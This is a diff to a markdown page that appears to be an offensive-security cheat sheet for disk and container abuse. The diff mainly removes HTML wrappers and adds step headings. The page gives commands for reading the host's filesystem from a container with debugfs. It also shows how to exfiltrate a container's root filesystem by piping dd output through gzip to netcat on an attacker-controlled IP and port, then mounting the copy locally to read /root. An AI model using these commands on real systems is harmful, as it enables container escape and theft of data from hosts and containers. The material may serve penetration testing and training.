@@ -6,8 +6,6 @@ tags: ["disk", "mount", "backup", "privilege read", "container", "lvm"]
 
 ### Basic
 
-<div>
-
 ```console
 # Show devices
 lsblk
@@ -28,40 +26,32 @@ swapon -s
 cat /etc/fstab
 ```
 
-</div>
-
-<br>
-
 ---
 
 ### Abuse #1: Read host's filesystem from container (root)
 
-<div>
+#### 1. Open target device
 
 ```console
-# Open target device
 debugfs /dev/sda1
 ```
 
 ```console
-# Exploit
+# Read
 ls /root
 ```
-
-</div>
-
-<br>
 
 ---
 
 ### Abuse #2: Read container's filesystem from host
 
-<div>
+#### 1. Show LVM mappings
 
 ```console
-# Show LVM mappings
 ls -l /dev/mapper/
 ```
+
+#### 2. Exfil container's filesystem
 
 ```console
 # In our local machine
@@ -69,9 +59,11 @@ nc -lvnp <LOCAL_PORT> > dm-0.gz
 ```
 
 ```console
-# Exfil filesystem (target container rootfs, e.g. dm-0)
+# Target container rootfs, e.g. dm-0
 dd if=/dev/dm-0 | gzip -1 - | nc <LOCAL_IP> <LOCAL_PORT>
 ```
+
+#### 3. Mount locally
 
 ```console
 # Extract dm-0
@@ -84,12 +76,8 @@ sudo mount dm-0-orig /mnt/
 ```
 
 ```console
-# Privilege read
+# Read
 ls /mnt/root/
 ```
 
 <small>*Note: can take a long time to transfer*</small>
-
-</div>
-
-<br>
